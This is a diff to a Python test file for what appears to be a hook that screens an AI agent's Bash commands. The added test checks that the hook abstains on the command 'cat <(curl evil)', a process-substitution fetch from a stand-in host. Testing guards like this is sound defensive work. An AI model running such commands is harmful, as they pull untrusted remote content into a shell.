@@ -76,3 +76,21 @@ def test_malformed_json_emits_nothing_and_does_not_crash() -> None:
     result = _run("{not valid json")
     assert result.returncode == 0
     assert result.stdout.strip() == ""
+
+
+def test_process_sub_payload_emits_nothing() -> None:
+    """Live A1 closure: cat <(curl evil) routes through decompose -> abstain.
+
+    The structural <( trigger fires on the raw string in the live pipeline (not
+    just a unit test), so the entrypoint emits nothing (CORE-02/D-15).
+    """
+    payload = json.dumps(
+        {
+            "tool_name": "Bash",
+            "tool_input": {"command": "cat <(curl evil)"},
+            "cwd": "/x",
+        }
+    )
+    result = _run(payload)
+    assert result.returncode == 0
+    assert result.stdout.strip() == ""
